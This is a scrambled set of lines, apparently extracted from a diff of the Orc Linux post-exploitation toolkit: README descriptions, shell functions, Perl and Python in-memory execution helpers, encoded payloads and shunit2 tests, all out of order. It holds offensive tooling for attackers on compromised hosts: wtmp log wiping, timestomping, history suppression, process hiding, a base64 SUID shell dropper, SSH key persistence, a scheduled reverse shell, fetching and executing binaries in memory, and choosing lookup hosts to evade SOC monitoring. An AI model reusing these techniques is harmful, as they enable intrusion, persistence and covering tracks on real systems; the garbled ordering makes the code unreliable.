+" [ ! -r ""$2"" ]"
+" [ ! -r ""$ENV"" ]"
+" [ ! -w ""$base"" ] "
+" [ ! -x ""$base"" ]"
+" [ ""$1"" -gt 31 ]"
+" [ ""$1"" = 'background' ]"
+" [ ""$HTTPS_PROXY"" != ""$https_proxy"" ]"
+" [ ""$HTTP_PROXY"" != ""$http_proxy"" ]"
+" [ -O ""/root"" ]"
+" [ -z ""$HTTPS_PROXY"" ]"
+" assertNull 'error message' ""$error"""
+" awk '$1==""1"" {print $2}'"
+" awk -F "" "" '{ print $2 }' "
+" awk -F "" "" '{print $3}') "
+" awk -F "":"" '{print $2}'"
+" awk -F"" "" '{print $1"" ""$2}' "
+" awk -v exclude=""$NOT_THIS"" '"
+" between different Unix flavors, shell types are collected."
+" by all shells, e.g. busybox shell."
+" dash, bash, ash, mksh supports local"
+" directory of orc, which is typical a tmpfs."
+" disabling shellcheck here, we have checked ulimit existence before."
+" else must be: ""$interpeter"" = 'pythonX'"
+" else: if https_proxy is defined, then never remind"
+" filter: home directory in field 6, directory only once"
+" filter: only existing directories, no dummy entries"
+" getsfiles is called without argument in the function, that is ok."
+" grep """
+" grep $orc_colorNever ""$1"" "
+" grep $orc_colorNever ""$PTS_NAME"" "
+" grep $orc_colorNever -v ""$1"" > ""$HOME/.l"""
+" grep $orc_colorNever -v ""::1$"""
+" grep $orc_colorNever -v crypt)"""
+" grep -qe """
+" grep -vqe """
+" is the address of the subnet, not of a host."
+" ksh, mksh, bash supports typeset"
+" match(tmp,/"
+" method   : Cuts the name from lines like PRETTY_NAME=""name""."
+" nc -w1 ""$1"" ""$2"" 2>/dev/null"
+" need a better way to do this, honestly"
+" no read, no write or no search-able access"
+" ps -p 1 is not supported by all systems, e.g. the busybox."
+" reminder: do not use gawk functions, e.g. systime"
+" rm -f ""$1.tar"""
+" set writeable, overwrite, zero overwrite, delete"
+" shellcheck disable=SC2039,SC2169"
+" shellcheck disable=SC2044,SC2086"
+" shellcheck disable=SC2119,SC2120"
+" shellcheck disable=SC2154,SC2086"
+" shellcheck disable=SC2169,SC2039"
+" so the call ""echo_argument a"" will return 0. (The program"
+" so the call ""echo_argument a"" will return 1."
+" strip ""use strict"
+" strip ""use warnings"
+" support the long option names, e.g. busybox."
+" supported on all systems, e.g. on busybox."
+" systems. On modern file systems like ext4, XFS often the data"
+" then echo ""--> $error"""
+" then echo ""--> $output"""
+" this janky, awful shortcut"
+" tools, like busybox grep, never uses color and don't"
+" tr -d """
+" tr -d '""' "
+" use short switches -a, -n because the long versions are not"
+" using stat and the shell glob, so no quotes"
+" wc -l)"" -gt 1 ]"
+" works in bash, dash and ksh but is not POSIX conform."
+" xz -9 ""$1.tar"" "
+"!' eq unpack 'a2', $bytes) {"
+"!/bin/sh' > ""$ORC_ECHO_FILE"""
+"!/bin/sh' > ""$base/.q/.t"""
+"""$LONGARG"
+"$(id -u)""i "
+"$ua->ssl_opts(verify_hostname => 0, SSL_verify_mode => 0)"
+"%s)"" '$1 "
+"' ""$1"" "
+"'"" >> ""$ORC_ECHO_FILE"""
+"'"" o.rc)"
+"') and signature[1] in (ord('!'), '!'):"
+"')"" is used to support python3 and python2."
+"'), '"
+"'),'"
+")     echo 'ERROR: invalid argument, must be a shell name' >"
+"- getdocker checks if the docker socket in /var/run/docker.sock exists, if we have write access, and then if we do, runs docker ps. ([Wiki](https://github.com/zMarch/Orc/wiki/getdocker))"
+"- getenum takes the versions from the kernel, glibc, and dbus. For privilege escalation exploits, they're usually the ones you want. It also prints the init system, because it's good to know that. ([Wiki](https://github.com/zMarch/Orc/wiki/getenum))"
+"- getidle gives you an accurate idle time for ptys, letting you see how recently other users have been active. ([Wiki](https://github.com/zMarch/Orc/wiki/getidle))"
+"- getip uses HTTP and DNS to get your external IP. It aims to use curl and dig, but will fall back to wget and host if it needs to. It grabs these from Akami and Google respectively to try and avoid using smaller sites that might flag in a SOC's logs or alerts. ([Wiki](https://github.com/zMarch/Orc/wiki/getip))"
+"- getjail does a check to see if we're in a chroot, and then does some very basic checks for hypervisors/virtualisation. If there are any better checks, let me know. ([Wiki](https://github.com/zMarch/Orc/wiki/getjail))"
+"- getluks uses lsblk to look for partitions of type crypt, indicating disk crypto. ([Wiki](https://github.com/zMarch/Orc/wiki/getluks))"
+"- getsec checks for the presence of SELinux, AppArmor, and GrSec. I thought about adding stuff for rkhunter/chkrootkit, but in my experience they're not much of a threat unless you're using rootkits from 2003. ([Wiki](https://github.com/zMarch/Orc/wiki/getsec))"
+"- getsuspect pulls down my suspect script and runs it, looking for malware or signs of compromise. ([Wiki](https://github.com/zMarch/Orc/wiki/getsuspect))"
+"- memexec uses some janky perl (see https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html who I stole much of the basis of it for) to execute a binary in-memory. No arguments or anything yet, and only x64 supported. ([Wiki](https://github.com/zMarch/Orc/wiki/memexec))"
+"- portscan should be fairly self-evident. It checks for the following open ports on one host: 21, 22, 23, 80, 443, 8080, 8443, 129, 445, 3389, 3306. ([Wiki](https://github.com/zMarch/Orc/wiki/portscan))"
+"- prochide grabs the longest process name from ps (because we can't hide arguments, but we can choose something that makes them relatively invisible in the noise) and uses that as the $0 of whatever you execute. ([Wiki](https://github.com/zMarch/Orc/wiki/prochide))"
+"- srm is just a wrapper around shred, basically. ([Wiki](https://github.com/zMarch/Orc/wiki/srm))"
+"- stomp is just an alias for ""touch -r"". ([Wiki](https://github.com/zMarch/Orc/wiki/stomp))"
+"- wiper uses utmpdump to dump wtmp into plain text and then greps out the string given as an argument. It then repacks the modified file into /var/log/wtmp, and ensures that the file is nicely time stomped. ([Wiki](https://github.com/zMarch/Orc/wiki/wiper))"
+".sh"" will"
+"/"" class=""bin-name"">/ {split($0,a,""/"")"
+"/PRETTY/ {gsub(/""/,"""",$2)"
+"0-9]/, """", $1 )"
+"1 because all bits 0 outside the bitmask is not allowed, it"
+"2))"" ""$(echo ""$output"""
+"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER"
+"Authors: Darren Martyn, March, Ulrich Berntien"
+"HISTFILE is unset, and we use ulimit -c 0 to try and prevent any corefiles showing up. If ulimit isn't present, we'll try and use the limit coredumpsize command."
+"I initially wrote this because I myself needed a more featureful post-exploitation toolkit for Linux. It's part of a larger bundle of scripts and tools, but I'll add those as I write and re-write them."
+"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,"
+"If /dev/shm does not exist or is mounted with noexec option, then the script can choose another directory."
+"It also contains a relatively decent selection of useful functions: some are currently not super featureful, and there's likely to be a large number of bugs, but you can find the vast majority of them by running the command 'gethelp'."
+"It creates a directory (.q) typical in /dev/shm, and all output of commands etc tend to go in there."
+"It takes the form of an ENV script, so load orc into a shell by running ENV=o.rc sh -i (it does need an interactive shell, I'm afraid)"
+"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,"
+"OVERSION=""0.6"""
+"PS1='$USER'""@$(hostname):""'$PWD'""$ "" "
+"Permission is hereby granted, free of charge, to any person obtaining a copy"
+"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
+"The Bourne shell dialects: bash, dash, sh and ksh are checked."
+"The directory ""tests"" and the files in this directory are "
+"The directory ""tests"" contains files to support the Orc development."
+"The encoder shell scripts strips the comments, gzips the file and"
+"The files in the directory ""tests"" are only needed during development"
+"The script starts the test run files. All files ""run_shunit2_"
+"]                Very loud, DO NOT USE."
+"]      getenum - get kernel, glibc, and dbus versions"
+"]    getdocker - check docker socket status, and list images."
+"authors: March, Darren Martyn, Ulrich Berntien"
+"base64 - > ""$1.base64"""
+"cd ""$HOME"" "
+"copies of the Software, and to permit persons to whom the Software is"
+"echo """
+"echo ""$HOME should be deleted upon exit."""
+"echo ""$backup"" > ""$ENV"""
+"echo ""$sshkey"" >> ""$NHOME/.ssh/authorized_keys"""
+"echo ""=== Welcome to Orc Shell ==="""
+"echo ""=========== Info ==========="""
+"echo ""============================"""
+"echo ""Bare metal!"""
+"echo ""Checking to see if we're in one giant simulation..."""
+"echo ""Dbus services for session:"""
+"echo ""Dbus services for system:"""
+"echo ""Docker socket exists, but we don't have access."""
+"echo ""Don't see the docker socket. No Docker"
+"echo ""Encrypted partition detected. No lsblk found. Investigate manual."""
+"echo ""Encrypted partition detected. Run lsblk to see more."""
+"echo ""GrSec and PaX live here."""
+"echo ""IP address on the network: """
+"echo ""Let's see if there are any defences."""
+"echo ""Listing docker images..."""
+"echo ""Run gethelp to see a list of commands."""
+"echo ""See https://github.com/taviso/dbusmap for additional dbus auditing!"""
+"echo ""Short kernel info: """
+"echo ""The compressed and encoded file is $1.base64"""
+"echo ""Virtual machine!"""
+"echo ""We're in a chroot."""
+"echo ""scheduling a reverse shell to launch later..."""
+"furnished to do so, subject to the following conditions:"
+"if [ ! -d ""$HOME"" ]"
+"if [ -S ""/var/run/docker.sock"" ]"
+"if [ -n ""$BASH"" ]"
+"if [ -r ""$ENV"" ]"
+"if [ -w ""/var/run/docker.sock"" ]"
+"if [ -z ""$backup"" ]"
+"if [ -z ""$urls"" ]"
+"import socket,sys"
+"import sys, urllib2"
+"in the Software without restriction, including without limitation the rights"
+"int main ( int argc, char"
+"lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536"
+"my $anon = ""/proc/$$/fd/$fd"""
+"my $code = getstore( $url, $anon )"
+"my $fd = syscall($syscallnr, $name, 1)"
+"my $name = """""
+"my $nrbytes = read $fh, my $bytes, 2"
+"my $prog = shift or die ""missing argument, program name"""
+"my $url = shift or die ""missing argument, the URL"""
+"n"" ""$(id -u)"" ""$(id -nu)"""
+"n"", $"
+"n"", argc-2 )"
+"n"", i, argv[i] )"
+"n"", stderr )"
+"of this software and associated documentation files (the ""Software""), to deal"
+"open my $fh, '<:raw', $anon"
+"print item[2] "" "" item[3]"
+"print item[2] "" "" item[4]"
+"print item[3] "" "" item[7]"
+"printf ""CPU model:"""
+"printf ""Disk usage:"""
+"printf ""Machine has been """
+"printf ""Number of cores: """
+"printf ""RAM available: """
+"printf ""Unique Machine ID: """
+"printf ""We are %s - (%s)"
+"printf ""exit code of the test script is %d"
+"split(substr($0,RSTART,RLENGTH),item,/[: ]"
+"sshkey=""ssh-rsa [YOUR KEY HERE] $(whoami)@$(hostname)"""
+"then echo ""AppArmor is probably installed."""
+"then echo ""SELinux is enabled."""
+"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell"
+"touch ""$HOME/.ssh"""
+"urls=$(grep --ignore-case --only-matching --extended-regexp ""'https"
+"w -- ""$file"""
+"wc -l) -eq 1 ]"""
+"wc -l) -ge 1 ]"""
+"wc -l) -ge 10 ]"""
+"wc -l) -ge 3 ]"""
+"wc -l) -ge 5 ]"""
+"wc -l)"" ""$(echo ""$output"""
+"wc -w) -ge 50 ]"""
+"wc -w)"""
+"x ""$HOME/.mem"""
+"x ""$base/.q/.t"""
+$/ {
+$2) ))
+([0-9][0-9]
+- coding: utf-8 -
+- dropsuid basically drops a tiny SUID shell written in ASM wherever. You'll need to chmod a
+- fpssh is just a wrapper around ssh-keyscan. ([Wiki](https://github.com/zMarch/Orc/wiki/fpssh))
+- getdbus lists all dbus services for delicious priv-esc. ([Wiki](https://github.com/zMarch/Orc/wiki/getdbus))
+- getescape attempts to find a way to escape a chroot by traversing a poorly configured /proc/. ([Wiki](https://github.com/zMarch/Orc/wiki/getescape))
+- getexploit pulls down the linux exploit suggester ([Wiki](https://github.com/zMarch/Orc/wiki/getexploit))
+- getgtfobins pulls down the list of current gtfobins and checks to see which are installed in your $PATH ([Wiki](https://github.com/zMarch/Orc/wiki/getgtfobins))
+- getinfo pulls basically everything useful and generic i could think of and sticks it in a tar.xz file for you. ([Wiki](https://github.com/zMarch/Orc/wiki/getinfo))
+- getnet does some basic network enumeration with arp and known_hosts. ([Wiki](https://github.com/zMarch/Orc/wiki/getnet))
+- getpty pops a pty using script. This pty should have Orc already loaded. ([Wiki](https://github.com/zMarch/Orc/wiki/getpty))
+- getrel prints the OS name from the release file. ([Wiki](https://github.com/zMarch/Orc/wiki/getrel))
+- getsctp checks if SCTP support is enabled. ([Wiki](https://github.com/zMarch/Orc/wiki/getsctp))
+- getsfiles lists setuid flagged files and setcap files. ([Wiki](https://github.com/zMarch/Orc/wiki/getsfiles))
+- getspec prints some basic hardware information. ([Wiki](https://github.com/zMarch/Orc/wiki/getspec))
+- gettmp lists typical directories for tmp files. ([Wiki](https://github.com/zMarch/Orc/wiki/gettmp))
+- getusers gets all users with a shell. ([Wiki](https://github.com/zMarch/Orc/wiki/getusers))
+- getuservices gets all processes running by users who don't have a shell. Useful. ([Wiki](https://github.com/zMarch/Orc/wiki/getuservices))
+- qssh uses an ASKPASS script to launch ssh without requiring a tty. Apply arguments as usual. ([Wiki](https://github.com/zMarch/Orc/wiki/qssh))
+- qsu uses an ASKPASS script to launch sudo without requiring a tty. Apply arguments as usual to sudo. ([Wiki](https://github.com/zMarch/Orc/wiki/qsu))
+- sourceurl sources a file via http or https download. ([Wiki](https://github.com/zMarch/Orc/wiki/sourceurl))
+- tools checks for common tools. ([Wiki](https://github.com/zMarch/Orc/wiki/tools))
+. ./shunit2/shunit2
+..:..:..:..:..:..$/)==0)
+./))
+.sh scripts
+.travis.yaml file in the root directory.
+/) {
+/[0-9]
+/dev/pts/}
+/gtfobins
+/rDYTSJpWa2tw3QyGA
+/zlwAh8/3X/5/vca4x4pHF337JejBQXn4DckTWOa3wQAAA==
+0.0.0.0
+1 > /dev/null)
+1.2.3
+1.2.3.4
+172.17.2.7
+1mj/bmhVKlYXAdRNTE
+255.255.255.255
+500.500.500.500
+500.500.500.500'
+51cMKVKCFMRzIwrNqlUPvXBYLX0ckdeZgNXEztrOAgL62
+65534 = 31 bits 1 and last bit 0. Written with
+65534) 
+6XoefUUmz
+6jGNVDcSwdy50KCauhZSY564dha9MY9Co2Z2pX
+73a5hD7zhbrZplG8XVR4fFY1/G6rVcJyr2
+7D6dspDb2j3yluDChA7o7TlG5CWma/wHwSxYceQYAAA==
+99We36NGliaY2rJCg5A
+:/) 
+://[
+====end
+A probably non-comprehensive list of functionality in Orc v$OVERSION.
+AAAAAIAECACABAgHAAAABwAAAAUAAAAAEAAA6AEAAADpWJCDwAxQw7sAAAAA6bgXAAAAzYDrAem7
+AlbEXd8/Ekm3nFR4huwXDPazdJ1O
+Also the comments inside the script files are not stored in the o.rc.
+BN7JLMa4RftTC8BJdP8NA15XtnwYpijM4jynsawOZrEUKAby/DB5dpC1Z
+Bcast[: ]
+ByUEH3e6gyAdGqbWmbg5/
+Copyright (c) 2019 March
+D3cJhmeLjT/MUkL9rYu/fH14CL9LgZHVx5YdDroxhSCYwrxTzHpuYf52kQkTToZEITNIxUlxLmWt
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+For details see the Travis CI job log.
+H4sIAEhQv1wAA31Uy27bMBC8
+H4sIANs4vlwAA41TS4/aMBC
+HISTSIZE=0
+HOWEVER. An overview:
+HVP5BsswgndbCB64qE
+Hb5xLQXJnCYUUFSiUZsAJKE10o8AyM8e3aUSNHNz7bhOIPswl2UWtVTsW
+Hvig7CnaofIgIPg
+IRC Channel: 
+IeM0pT6WBYlEcENlJzdWG21UKHWco6l4SsIQFNxkaXeWpY1WPBfMKboFy9uBR24OYC9waAMT6
+IhATWZ3MwYcTsZ102ruQZ3ZzRa4WO5RxTU81TafuUeIlwfRqPlWbwsk9L2ebzrwUul7OEMKvW6bA
+Inside o.rc a shell function calls the Perl or Python interpreter
+It will also auto-delete this directory on exit.
+KH6ZVOKBCYx6frEtzq5572VslPBIA5VINALhgkPBSkPpduxQrLgrGq
+MIT License
+Mask[: ]
+My7Cg2UO9zG7syQvK6kMJOZcoZ5wv5Pdv6pgJpOqbPf6rCdGnTcToJUpWUKtioLvY4W/a9QGGjtC
+NHOME=$(orc_homeOfCurrentUser)
+NHOME=''
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+QJKOA1zLEz3jWYfQ2l1SidgEaUmA7yw0mplY4ptIl9Fz6dIoEf518d
+SHELL=$(command -v sh)
+SHUNIT_COLOR='always'
+SOFTWARE.
+SOT5/D
+Scripts in the tests sub-directory automatically tests Orc functions. Current the tests are in construction.
+TTT=0
+TTT=1
+Tests of the Orc script file are executed automatically with the [Travis CI](https://travis-ci.org/) service.
+The above copyright notice and this permission notice shall be included in all
+The directory resources and the files in this directory are 
+The directory resources contains files to support the Orc development.
+The files in the directory resources are only needed during development
+The orc function memexec is based on a Perl or a Python function.
+The script checks the included scripts from the resources subdirectory.
+The script compares the base64 encoded ode blocks in the Orc source file
+The script is called by the Travis CI system. The calls are in the 
+The scripts are stored gziped and base64 encoded in the o.rc file.
+The scripts gets the shell interpreter to use as argument.
+The scripts loads the [shunit2](https://github.com/kward/shunit2)
+The tests are shunit2 based.
+The tests will be widened over the time.
+The used directory is stored in the HOME variable. The user account home directory is stored in the NHOME variable.
+These scripts tests the Orc code. The Orc files is sourced by the tests scripts.
+UsWUYnxjbDdNhVwnoLcI3
+W67VQi
+WM4ahKnSWqzv
+XDQqEwe8z65x9m6qyYw9nGeUTbR6zxuXxzVJVJsw4lbJUewEWgpzNIZYScVvetEgI/Q8JrQnxCR
+You can also source it.
+ZYVigqcEKwPfHHqvlFQXrrevfSjHU8KK4knU5R6Vhi38cU7Bab16Wi2DDSzmH6ce4ov1ygJ3qxZg
+[![Build Status](https://api.travis-ci.org/zMarch/Orc.svg
+[0-9
+[0-9]
+[0-9][0-9]
+[A-F0-9]
+[ShellCheck](https://www.shellcheck.net/) is used to ensure wide compatibility of the Orc script.
+[a-f0-9]
+]                hangup [PTS NUMBER]
+]                memexec [full URI] [program arguments]
+]                on the /proc/ filesystem
+]                prochide [program 
+]          qsu - sudo without a tty - qsu [password] [normal arguments]
+]          srm - alias for secure shredding of files
+]         qssh - ssh without a tty - qssh [password] [normal arguments]
+]        fpssh - pull ssh remote host fingerprints - fpssh [host]
+]        getip - get external IP from akamai and google (HTTP and DNS)
+]        stomp - alias for touch -r (needs arguments)
+]        tools - check for common tools
+]        wiper - remove entries from wtmp - wiper [string to grep out]
+]       getnet - attempt to enumerate hosts on the local network with ping
+]       getpty - pop a pty with script
+]       getrel - attempt to get the OS release file.
+]       getsec - check if the big three security MAC programs are around
+]       gettmp - list typical directories for tmp files
+]       hangup - terminate someones PTS by killing their SSH process.
+]      getdbus - list all dbus services
+]      getidle - list all ptys and their idle times accurately.
+]      getinfo - create a tar.xz of useful command output
+]      getjail - check if we're in a chroot/VM
+]      getluks - attempt to detect disk crypto with lsblk or dmesg
+]      getspec - grab some hardware information
+]      memexec - execute a binary in-memory from a web-server
+]     dropsuid - drop tiny suid shell - dropsuid > [file]
+]     getusers - pull all users with a shell
+]     portscan - run a portscan against common ports - portscan [host]
+]     prochide - run a program with $0 changed to the longest entry in ps
+]    getescape - attempt to escape chroot via bad privs
+]    getsfiles - list setuid flagged files and setcap files
+]    sourceurl - source a downloaded file - sourceurl URL
+]   getexploit - download and run linux-exploit-suggester
+]   getsuspect - pull my suspect tool from github
+]  getgtfobins - pull a list of the current gtfobins and find which are on the system
+] getuservices - list all running services with non-user accounts in passwd
+a9vDkc18YPPO2dBvz4/0ay6505cUhCurX3BF3/iX5KRPO5hO4KtmHLDQOAqDJ0xeGjF3dsan8EgO
+aarch64)-linux/) {
+addons:
+addr[: ]
+alias 'echo'='/bin/echo'
+alias 'getp'='getent passwd'
+alias 'less'='LESSHISTFILE=/dev/null less'
+alias 'listener'='netstat -peanuto'
+alias 'mysql'='MYSQL_HISTFILE=/dev/null mysql'
+alias 'netgrep'='netstat -peanuto 
+alias 'psfull'='ps -weFH'
+alias 'psql'='PSQL_HISTORY=/dev/null psql'
+alias 'ssh'='ssh -T -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no'
+alias 'stomp'='touch -r'
+alias 'vim'='vim -ni NONE'
+alias 'wget'='wget --no-hsts'
+armeb
+backup=''
+base64 encode the binary gzip output.
+be started by the script.
+branch=master)](https://travis-ci.org/zMarch/Orc)
+broadcast/) {
+cat /etc/machine-id
+close $fh
+command -V aa-status >/dev/null 2>/dev/null
+copies or substantial portions of the Software.
+cuACKa
+dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames
+dbus-send --system --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames
+df -h
+docker ps
+done
+dropsuid() {
+echo 'Check - memexec.py is included'
+echo 'The echo_arguments test script'
+echo 'This is a output line to stderr' >
+echo 'check - memexec.pl is included'
+echo_arguments.c
+echo_arguments.sh
+echo_function() {
+elif command -v typeset > /dev/null
+elif orc_existsProg dmesg
+elif orc_existsProg limit
+else
+else {
+elsif($Config{archname} =
+encode_perl_script.sh
+encode_python_script.sh
+errorFlag=0
+ether 50:46:5d:dd:05:20  txqueuelen 1000  (Ethernet)
+except Exception as error:
+except ImportError:
+except:
+exit $
+exit $errorFlag
+export SHUNIT_COLOR
+f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAA
+f4ngEyzeplhyrbnIiVlelyiM3tjJA0atqpTMFStBsBKhrGmc9wg5f0EReJLW0JFzyXZzz8GZD
+false as valid shells.
+false$/ {shells[$1]=1}
+fe80::8836:5635:53b7:5706
+for address in $urls
+for arg
+for runner in ./tests/run_shunit2_
+fpssh() {
+free -hm 
+g2RhklRgg7RMnwnC9lrkVsYP
+getdbus() {
+getdocker () {
+getenum() {
+getescape() {
+getexploit () {
+getgtfobins() {
+gethelp() {
+getidle() {
+getinfo() {
+getip() {
+getjail() {
+getluks() {
+getnet() {
+getpty() {
+getrel() {
+getsctp() {
+getsec() {
+getsfiles () {
+getspec() {
+getsuspect() {
+gettmp () {
+getusers() {
+getuservices() {
+grep $orc_colorNever -c processor /proc/cpuinfo
+grep $orc_colorNever name /proc/cpuinfo 
+grep -v '
+gzip --stdout - 
+hangup() {
+iIAECLgLAAAAMckx0usB6THJzYAAAC9iaW4vc2g=
+iIDRWNZmQLZ5J7btdQ/pG3XHxwPxg5
+if ! $res/encode_perl_script.sh $res/memexec.pl
+if ! $res/encode_python_script.sh $res/memexec.py
+if ! [ -d 'shunit2' ]
+if ! orc_existsTestCommand cp > /dev/null 2> /dev/null
+if [ ! -f ./o.rc ]
+if [ ! -f ./shunit2/shunit2 ]
+if [ $
+if [ -d 'shunit2' ]
+if [ -f /etc/machine-id ]
+if command -v local > /dev/null
+if dmesg 
+if dmesg -T 
+if echo $
+if echo $TTT 
+if echo 'test' 
+if grep -q PaX /proc/self/status
+if grep -qi 'hypervisor' /proc/cpuinfo
+if hash ' not a program ' > /dev/null 2> /dev/null
+if lsblk -al 
+if orc_existsProg ifconfig
+if orc_existsProg lsblk
+if orc_existsProg ulimit
+if orc_existsTestCommand ' not a program ' > /dev/null 2> /dev/null
+if stat -c '%i' '/' 
+if($Config{archname} =
+if($code != 200) {
+if($fd == -1) {
+if($nrbytes != 2) {
+if('
+ifconfig 
+import ctypes
+import os
+import platform
+import sys
+include <stdio.h>
+inelegant hack
+ip addr show 
+j3uxwhTycEH7rBKHlFVicVWszHmLS/RAke4riisRZbrIeK9l
+keyinstall() {
+language: minimal
+matrix:
+memexec() {
+memexec.pl
+memexec.py
+my $syscallnr = -1
+n' ' ' 
+n22JZQoAjJPmYq
+netmask 
+nologin or 
+nologin$
+oneTimeSetUp() {
+orc on irc.hackint.eu
+orc_IP4toInteger() {
+orc_archive () {
+orc_collectOtherHostsInfo() {
+orc_createEchoFile () {
+orc_existsProg () {
+orc_exportProxySettings () {
+orc_filterIpAddress() {
+orc_firstIP4integer() {
+orc_flatFileName() {
+orc_homeOfCurrentUser () {
+orc_homeOfUserID () {
+orc_httpsProxyReminder() {
+orc_inetAddressAndMask() {
+orc_integerToIP4() {
+orc_isMinimalOsVersion() {
+orc_lastIP4integer() {
+orc_lengthToIP4netmask() {
+orc_listArp() {
+orc_listBroadcastAddress() {
+orc_listHomes() {
+orc_listTmp() {
+orc_listUsers() {
+orc_loadURL () {
+orc_log2outp() {
+orc_makeHome
+orc_makeHome() {
+orc_noop() {
+orc_ourPts() {
+orc_pingBroadcast() {
+orc_pingIP4localnet() {
+orc_testAndCopy() {
+orc_tryTcpConnection () {
+pc64
+pc64le)-linux/) {
+portscan() {
+prochide() {
+psgrep() {
+python -c '
+qssh() {
+qsu() {
+qtCDI3nme2UygaBRCMsfd/P5ilV1ifC4i7sNgQ1qe5QWEnsLh/oseME2i6A6QFcdFCVlySVk0B8t
+qxt7Frn2dZWgHo/Gn94al4Xy2XN99WEUjU2qRrdx7jKO4
+rVLkWtVbxE0pWHNZbobSFQHYLwwRWq
+readonly res=resources
+release
+request = urllib2.urlopen(sys.argv[1])
+rm $ENV
+sc3jwF7YfAqNFRxD5E/hGaJ
+script:
+sctp ' /proc/modules
+sctp' 
+selinuxenabled >/dev/null 2>/dev/null
+short o-o.myaddr.l.google.com @ns1.google.com 
+sourceurl () {
+sparc64)-linux/) {
+srm() {
+strict 
+sx it. ([Wiki](https://github.com/zMarch/Orc/wiki/dropsuid))
+sys.exit(0)
+sys.stdout.write(request.read())
+sys_call_numbers = {
+tHttvV
+test framework.
+test_dropsuid() {
+test_getdbus() {
+test_getdocker() {
+test_getenum() {
+test_getescape() {
+test_getexploit() {
+test_getgtfobins() {
+test_gethelp() {
+test_getidle() {
+test_getinfo() {
+test_getip() {
+test_getjail() {
+test_getluks() {
+test_getnet() {
+test_getrel() {
+test_getsctp() {
+test_getsec() {
+test_getsfiles() {
+test_getspec() {
+test_gettmp() {
+test_getusers() {
+test_getuservices() {
+test_orc_IP4toInteger () {
+test_orc_colorNever () {
+test_orc_createEchoFile () {
+test_orc_existsProg () {
+test_orc_exportProxySettings () {
+test_orc_filterIpAddress () {
+test_orc_firstIP4integer() {
+test_orc_flatFileName () {
+test_orc_homeOfCurrentUser () {
+test_orc_homeOfUserID () {
+test_orc_inetAddressAndMask () {
+test_orc_integerToIP4 () {
+test_orc_isMinimalOsVersion () {
+test_orc_lastIP4integer() {
+test_orc_lengthToIP4netmask() {
+test_orc_listArp () {
+test_orc_listBroadcastAddress () {
+test_orc_listHomes () {
+test_orc_listTmp () {
+test_orc_listUsers () {
+test_orc_loadURL () {
+test_orc_log2outp () {
+test_orc_makeHome () {
+test_orc_noop () {
+test_orc_ourPts () {
+test_orc_testAndCopy () {
+test_orc_tryTcpConnection () {
+test_portscan() {
+test_prochide() {
+test_sourceurl() {
+test_srm() {
+test_tools() {
+the o.rc code.
+time=3 
+timedshell() { 
+to run o.rc. To run o.rc only the o.rc file is needed.
+tools() {
+touch -r /
+trap 'rm -rf $HOME' EXIT TERM INT
+tries=1 TXT 
+try:
+umask 002
+uname -rni
+unset HISTFILE
+uptime -p
+use 
+use Config
+use LWP::Simple qw($ua get getstore)
+use strict
+use warnings
+vJ376TPOs6
+vXf7ut
+warnings 
+wc -l) 
+we use akamai and google here because they're gonna look less dodgy in SOC's logs
+wiper() {
+with the code developed here.
+with the current script files.
+yXjzX7Qg2MAr8mT0Xs4B1iqfyqwySy9wL9Jr/HJJf/RZDq8
+yu2yUESaih27LiuUffS5lAg6KHozQgCWlrJbCRSJanYRtF/75LU
+} ))
